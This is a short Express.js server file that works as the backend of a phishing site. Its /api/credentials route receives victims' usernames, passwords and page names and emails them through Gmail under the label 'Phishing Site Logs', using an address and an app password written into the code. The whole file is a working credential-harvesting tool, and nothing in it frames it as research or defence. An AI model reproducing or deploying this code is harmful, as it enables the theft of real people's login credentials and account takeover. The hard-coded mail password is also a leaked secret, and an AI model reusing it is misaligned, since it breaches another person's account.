const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// --- Nodemailer Configuration ---
// IMPORTANT: Make sure you use your App Password, not your normal password
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'locanmash@gmail.com', 
    pass: 'ytqk lqxe wumc vqik' // Your 16-character App Password
  }
});

// A simple route to test if the server is running
app.get('/', (req, res) => {
  res.send('Backend server is running!');
});

// The main route to handle credential submissions
app.post('/api/credentials', (req, res) => {
  const { username, password, page } = req.body;

  // --- Email Options ---
  const mailOptions = {
    from: '"Phishing Site Logs" <locanmash@gmail.com>',
    to: 'locanmash@gmail.com',
    subject: 'New Login Credentials Captured',
    text: `You have a new submission.\n\nPage: ${page}\nUsername: ${username}\nPassword: ${password}`
  };

  // --- Send the Email ---
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ message: 'Error sending email.' });
    }
    console.log('Email sent: ' + info.response);
    res.status(200).json({ message: 'Credentials received and emailed successfully!' });
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
